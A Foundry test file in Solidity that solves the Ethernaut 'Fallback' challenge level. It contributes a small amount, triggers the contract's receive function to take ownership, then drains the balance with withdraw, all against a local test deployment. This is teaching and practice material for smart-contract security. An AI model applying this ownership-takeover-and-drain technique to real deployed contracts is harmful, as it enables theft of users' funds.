// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import "forge-std/Test.sol";
import {Fallback} from "../../src/levels/Fallback.sol";

// 0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84
contract FallbackTest is Test {
    Fallback private level1;
    address attacker = address(0x123);

    function setUp() public {
        level1 = new Fallback();
    }

    function testDrainFallbackContract() public {
        // Add contribution from deployer
        level1.contribute{value: 100 gwei}();

        // Add some ether to attacker account
        vm.deal(attacker, 1 ether);

        // Change msg.sender to attacker for all following calls
        vm.startPrank(attacker);

        level1.contribute{value: 1 gwei}();

        uint contractBalanceBeforeAttack = address(level1).balance;
        emit log_named_uint(
            "Contract balance before attack",
            contractBalanceBeforeAttack
        );

        // Send ether to contract without specifying msg.data
        // Since calldata is empty and msg.value contains non-zero value, this will trigger the receive function
        (bool success, ) = address(level1).call{value: 1 gwei}("");
        assertTrue(success, "Failed to trigger receive function");

        address newOwner = level1.owner();
        assertEq(attacker, newOwner);
        emit log_named_address("New Owner", newOwner);

        uint attackerContribution = level1.getContribution();

        uint attackerBalanceBeforeAttack = attacker.balance;

        // Drain the contract
        level1.withdraw();

        assertEq(address(level1).balance, 0, "Contract balance did not drain");

        uint attackerBalanceAfterAttack = attacker.balance;

        uint increment = attackerBalanceAfterAttack -
            attackerBalanceBeforeAttack;
        emit log_named_uint("Increment", increment);

        // Assert balance changes are greater than contributions made
        assertGt(increment, attackerContribution, "Attack failed 1");

        // Assert increment in balance is equal to contract balance
        //assertEq(increment, contractBalanceBeforeAttack, "Attack failed 2");

        emit log_named_uint(
            "Contract balance after attack",
            address(level1).balance
        );

        vm.stopPrank();
    }
}
